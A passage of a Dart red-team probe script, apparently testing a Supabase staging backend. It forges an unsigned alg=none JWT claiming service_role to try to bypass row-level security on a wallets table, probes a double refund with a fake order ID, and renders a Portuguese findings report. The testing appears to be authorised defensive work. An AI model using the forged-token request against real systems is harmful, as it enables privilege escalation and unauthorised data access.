            utf8.encode(
              jsonEncode({
                'role': 'service_role',
                'iss': 'supabase',
                'ref': stagingRef,
                'sub': buyerId,
              }),
            ),
          )
          .replaceAll('=', '') +
      '.';
  final res = await http.get(
    Uri.parse('$base/rest/v1/wallets?select=*&limit=3'),
    headers: {
      'apikey': anon,
      'Authorization': 'Bearer $none',
    },
  );
  if (res.statusCode == 200) {
    List rows = [];
    try {
      rows = jsonDecode(res.body) as List;
    } catch (_) {}
    if (rows.length > 1) {
      addResult(
        id: 'C-JWT-NONE',
        severity: 'P0',
        title: 'JWT alg=none aceite como service_role',
        verdict: 'FAIL',
        pre: 'anon key pública',
        exploit: 'Authorization Bearer alg=none role=service_role',
        proof: 'HTTP 200 n=${rows.length} ${clip(res.body, 300)}',
        impact: 'bypass RLS sistémico',
        boundary: 'GoTrue/JWT',
      );
    } else {
      pass(
        'C-JWT-NONE',
        'JWT alg=none',
        'HTTP ${res.statusCode} n=${rows.length} ${clip(res.body, 160)}',
      );
    }
  } else {
    pass(
      'C-JWT-NONE',
      'JWT alg=none',
      'HTTP ${res.statusCode} ${clip(res.body, 160)}',
    );
  }
}

Future<void> probeConcurrencyHints() async {
  coverage.add('Duplo invoke refund-order em UUID inexistente (sem destruir orders pagas)');
  const fake = '00000000-0000-0000-0000-000000000099';
  final r1 = await edge('refund-order', jwt: sellerJwt, body: {'order_id': fake});
  final r2 = await edge('refund-order', jwt: sellerJwt, body: {'order_id': fake});
  chains.add({
    'id': 'CHAIN-DOUBLE-REFUND-FAKE',
    'r1': '${r1.statusCode} ${clip(r1.body, 200)}',
    'r2': '${r2.statusCode} ${clip(r2.body, 200)}',
  });
  pass(
    'C-DOUBLE-REFUND-SEQ',
    'dois refund-order seguidos (UUID inexistente)',
    'r1=${r1.statusCode} ${clip(r1.body, 140)} | r2=${r2.statusCode} ${clip(r2.body, 140)}',
  );
  gaps.add(
    'double-refund em order Stripe paga real não executado (evitar destruir encomendas de teste existentes)',
  );
}

String renderMd(Map<String, dynamic> schema, Map<String, dynamic> openApi) {
  final p0 = results.where((e) => e['severity'] == 'P0').toList();
  final p1 = results.where((e) => e['severity'] == 'P1').toList();
  final p2 = results.where((e) => e['severity'] == 'P2').toList();
  final p3 = results.where((e) => e['severity'] == 'P3').toList();
  String letter;
  if (p0.isNotEmpty) {
    letter = 'A) existem P0';
  } else if (p1.isNotEmpty) {
    letter = 'B) sem P0, mas existem P1';
  } else if (results.isNotEmpty) {
    letter = 'C) sem P0/P1 confirmados';
  } else {
    letter = 'C) sem P0/P1 confirmados';
  }

  String fmtFinding(Map<String, dynamic> f) => '''
### ${f['id']} — ${f['title']}

**Severidade:** ${f['severity']}
**Pré-condições:** ${f['pre']}
**Exploração:** ${f['exploit']}
**Prova:** ${f['proof']}
**Impacto:** ${f['impact']}
**Causa raiz:** ${f['root']}
**Fronteira que falhou:** ${f['boundary']}
**Reprodutibilidade:** ${f['repro']}
''';

  final buf = StringBuffer();
  buf.writeln('# RED TEAM CEGO C — CONGELADO');
  buf.writeln();
  buf.writeln('FROZEN_AT: $frozenAt');
  buf.writeln('Ambiente: Supabase staging `$stagingRef` · Stripe TEST MODE');
  buf.writeln('Produção não tocada: SIM');
  buf.writeln();
  buf.writeln('## Veredicto');
  buf.writeln('P0: ${p0.length}');
  buf.writeln('P1: ${p1.length}');
  buf.writeln('P2: ${p2.length}');
  buf.writeln('P3: ${p3.length}');
  buf.writeln();
  buf.writeln('## Mapa de ataque');
  buf.writeln(
    'Identidades: buyer `$buyerId`, seller `$sellerId` (JWT password grant). '
    'Anon key usada para OpenAPI, webhook, storage list, ps-claim, GET settle.',
  );
  buf.writeln();
  buf.writeln(
    'OpenAPI: ${(openApi['tables'] as List?)?.length ?? 0} tabelas, '
    '${(openApi['rpcs'] as List?)?.length ?? 0} RPCs (ficheiros openapi_*.txt).',
  );
  buf.writeln();
  buf.writeln('### Superfícies verificadas');
  for (final c in coverage) {
    buf.writeln('- $c');
  }
  buf.writeln();
  buf.writeln('## Achados confirmados');
  if (results.isEmpty) {
    buf.writeln('_Nenhum FAIL confirmado nesta passagem._');
  } else {
    for (final f in results) {
      buf.writeln(fmtFinding(f));
    }
  }
  buf.writeln();
  buf.writeln('## Hipóteses testadas que NÃO funcionaram');
  for (final f in blocked) {
    buf.writeln('- **${f['id']}** ${f['title']}: ${f['proof']}');
  }
  buf.writeln();
  buf.writeln('## Cadeias/composições testadas');
  for (final c in chains) {
    buf.writeln('- `${c['id']}`: ${jsonEncode(c)}');
  }
  buf.writeln();
  buf.writeln('## Cobertura');
  for (final c in coverage) {
    buf.writeln('- $c');
  }
  buf.writeln();
  buf.writeln('## Lacunas');
  if (gaps.isEmpty) {
    buf.writeln('- Pagamento Stripe completo (card confirm) não foi feito para não criar charge extra; quote/checkout URL foram o oráculo de montante.');
    buf.writeln('- Corridas paralelas verdadeiras (isolates/HTTP burst) limitadas a retries sequenciais.');
    buf.writeln('- service_role não foi usada como atacante.');
  } else {
    for (final g in gaps) {
      buf.writeln('- $g');
    }
  }
  buf.writeln();
  buf.writeln('## Artefactos');
  for (final a in artifacts) {
    buf.writeln('- `$a`');
  }
  buf.writeln();
  buf.writeln('## Veredicto de segurança');
  buf.writeln();
  buf.writeln(letter);
  buf.writeln();
  buf.writeln('Schema dump (auditor, excerpt): `tool/reports/redteam_cego_c_20260829/probe.json` campo `schema_excerpt`.');
  return buf.toString();
}
